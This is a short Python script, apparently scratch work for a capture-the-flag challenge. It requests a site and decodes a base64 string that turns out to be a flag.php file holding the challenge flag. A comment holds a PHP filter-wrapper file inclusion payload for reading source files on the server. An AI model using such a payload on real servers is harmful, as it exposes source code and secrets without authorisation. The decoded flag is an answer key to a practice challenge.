import base64

import requests

i = 0
#php://filter/read=convert.base64-encode/resource=flag.php
r = requests.get(
    f'http://push-val.com')
print(r.headers)
# PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7YmI3ZWIzNmQtZjczMi00ZGJiLWE0MDQtNDJjY2Q1MDAzZTkwfQo=

b = base64.b64decode('PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7YmI3ZWIzNmQtZjczMi00ZGJiLWE0MDQtNDJjY2Q1MDAzZTkwfQo=')

print(b)